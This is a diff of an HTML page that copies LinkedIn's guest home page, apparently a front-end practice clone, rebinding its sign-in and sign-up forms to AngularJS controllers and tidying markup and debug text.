@@ -4,30 +4,30 @@
 <head>
     <link rel="stylesheet" type="text/css" href="stylesheets/style.css">
     <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.14/angular.min.js"></script>
+    <script src="javascripts/myApp.js"></script>
 </head>
 
 <body class="new-ghome" id="pagekey-guest-home">
 
 <div id="header">
     <div class="container">
-        <h1><img src="https://static.licdn.com/scds/common/u/img/logos/logo_132x32_2.png" alt="LinkedIn" class="logo" height="32" width="132"></h1>
+        <h1><img src="https://static.licdn.com/scds/common/u/img/logos/logo_132x32_2.png" alt="LinkedIn" class="logo"
+                 height="32" width="132"></h1>
 
         <p class="textad"></p>
 
         <div class="login">
-            <form ng-submit="submit()"  novalidate id="login" class="ajax-form" data-jsenabled="check">
-                <p ng-model="response">hehe</p>
-                <p>Res: {{ response }}</p>
-                <input type="hidden" name="source_app" value="">
+            <form  ng-controller="SignInFormController as signinCtrl" ng-submit="signinCtrl.submit()" id="login" class="ajax-form">
+                <!--<p>Res: {{ response }}</p>-->
                 <fieldset>
-
                     <ul id="control_gen_1">
                         <li>
-                            <label for="session_key-login">Email address</label>
+                            <label>Email address</label>
 
                             <div class="fieldgroup">
                                 <span class="error" id="session_key-login-error"></span>
-                                <input ng-model="signin.email" type="text" name="session_key" value="" id="session_key-login" autofocus="" tabindex="1" size="27" data-ime-mode-disabled="">
+                                <input ng-model="signinCtrl.email" type="text" name="session_key" value=""
+                                       id="session_key-login" autofocus="" tabindex="1" size="27">
                             </div>
                         </li>
                         <li>
@@ -35,14 +35,15 @@
 
                             <div class="fieldgroup">
                                 <span class="error" id="session_password-login-error"></span>
-                                <input ng-model="signin.password" type="password" name="session_password" value="" id="session_password-login" tabindex="2" size="27">
+                                <input ng-model="signinCtrl.password" type="password" name="session_password"
+                                       value="" id="session_password-login" tabindex="2" size="27">
                             </div>
                         </li>
                         <li class="button">
-                            <input type="submit" name="signin" value="Sign In" id="signin" tabindex="3" class="btn-secondary">
+                            <input type="submit" name="signin" value="Sign In" id="signin" tabindex="3"
+                                   class="btn-secondary">
                         </li>
                     </ul>
-
                 </fieldset>
             </form>
         </div>
@@ -54,19 +55,28 @@
     <div id="main">
         <header>
             <div id="content">
-                <h2><span class="text-gradient"></span><span class="headline">
-Connect, share ideas, and discover opportunities.
-</span></h2>
+                <h2>
+                    <!--<span class="text-gradient"></span>-->
+                    <span class="headline">
+                        Connect, share ideas, and discover opportunities.
+                    </span>
+                </h2>
             </div>
         </header>
         <section>
             <div class="two-row-image">
-                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_1_150x150_v1.png" width="150" height="150" alt="Male Headshot">
-                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_2_150x150_v1.png" width="150" height="150" alt="Female Headshot">
-                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_3_150x150_v1.png" width="150" height="150" alt="Male Headshot">
-                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_4_150x150_v1.png" width="150" height="150" alt="Female Headshot">
-                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_5_150x150_v1.png" width="150" height="150" alt="Male Headshot">
-                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_6_150x150_v1.png" width="150" height="150" alt="Male Headshot">
+                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_1_150x150_v1.png"
+                     width="150" height="150" alt="Male Headshot">
+                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_2_150x150_v1.png"
+                     width="150" height="150" alt="Female Headshot">
+                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_3_150x150_v1.png"
+                     width="150" height="150" alt="Male Headshot">
+                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_4_150x150_v1.png"
+                     width="150" height="150" alt="Female Headshot">
+                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_5_150x150_v1.png"
+                     width="150" height="150" alt="Male Headshot">
+                <img src="https://static.licdn.com/scds/common/u/images/apps/home/guesthome/ghp_international_6_150x150_v1.png"
+                     width="150" height="150" alt="Male Headshot">
             </div>
         </section>
         <section>
@@ -76,54 +86,54 @@ Connect, share ideas, and discover opportunities.
                 </div>
                 <div class="content">
                     <p>Registration takes less than 2 minutes.</p>
-
-                    <form ng-submit="coldRegistrationForm.$valid && submit()" ng-controller="signUpFormController" name="coldRegistrationForm" novalidate class="feature" data-jsenabled="check" id="guest-home-reg-form">
-                        <p>result {{ response }}</p>
+                    <form ng-controller="SignUpFormController as signupCtrl" ng-submit="signupCtrl.submit()"
+                          name="coldRegistrationForm" novalidate class="feature" id="guest-home-reg-form">
+                        <!--<p>firstname {{ signupCtrl.signupform.firstname }}</p>-->
                         <fieldset>
                             <legend>Sign Up</legend>
                             <ul>
                                 <li id="first-name">
-                                    <label for="firstName-coldRegistrationForm" id="control_gen_2" style="display: none;">First name</label>
-
                                     <span class="error" id="firstName-coldRegistrationForm-error"></span>
 
                                     <div class="fieldgroup">
-                                        <input ng-model="signup.firstname" required type="text" name="firstName" value="" id="firstName-coldRegistrationForm" autocomplete="on" size="55" maxlength="20" tabindex="5" placeholder="First name">
+                                        <input ng-model="signupCtrl.signupform.firstname" required type="text" name="firstName"
+                                               value="" id="firstName-coldRegistrationForm" autocomplete="on" size="55"
+                                               maxlength="20" tabindex="5" placeholder="First name">
                                     </div>
                                 </li>
                                 <li id="last-name">
-                                    <label for="lastName-coldRegistrationForm" id="control_gen_3" style="display: none;">Last name</label>
-
                                     <span class="error" id="lastName-coldRegistrationForm-error"></span>
 
                                     <div class="fieldgroup">
-                                        <input ng-model="signup.lastname" required type="text" name="lastName" value="" id="lastName-coldRegistrationForm" autocomplete="on" size="55" maxlength="40" tabindex="6" placeholder="Last name">
+                                        <input ng-model="signupCtrl.signupform.lastname" required type="text" name="lastName" value=""
+                                               id="lastName-coldRegistrationForm" autocomplete="on" size="55"
+                                               maxlength="40" tabindex="6" placeholder="Last name">
                                     </div>
                                 </li>
                                 <li id="email-address">
-                                    <label for="email-coldRegistrationForm" id="control_gen_4" style="display: none;">Email address
-                                    </label>
-
                                     <span class="error" id="email-coldRegistrationForm-error"></span>
 
                                     <div class="fieldgroup">
-                                        <input ng-model="signup.email" required type="email" name="email" value="" id="email-coldRegistrationForm" autocomplete="on" size="55" maxlength="128" tabindex="7" data-ime-mode-disabled="" placeholder="Email address">
+                                        <input ng-model="signupCtrl.signupform.email" required type="email" name="email" value=""
+                                               id="email-coldRegistrationForm" autocomplete="on" size="55"
+                                               maxlength="128" tabindex="7" placeholder="Email address">
                                     </div>
                                 </li>
                                 <li id="password">
-                                    <label for="password-coldRegistrationForm" id="control_gen_5" style="display: none;">Password (6 or more characters)</label>
-
                                     <span class="error" id="password-coldRegistrationForm-error"></span>
 
                                     <div class="fieldgroup">
-                                        <input ng-model="signup.password" required type="password" name="password" value="" id="password-coldRegistrationForm" tabindex="8" placeholder="Password (6 or more characters)">
+                                        <input ng-model="signupCtrl.signupform.password" required type="password" name="password"
+                                               value="" id="password-coldRegistrationForm" tabindex="8"
+                                               placeholder="Password (6 or more characters)">
                                     </div>
                                 </li>
                             </ul>
 
                             <div class="form-bottom-row">
                                 <p class="action">
-                                    <input type="submit" name="" value="Join now" id="btn-submit" class="btn-action" tabindex="9">
+                                    <input type="submit" name="" value="Join now" id="btn-submit" class="btn-action"
+                                           tabindex="9">
                                 </p>
                             </div>
                         </fieldset>
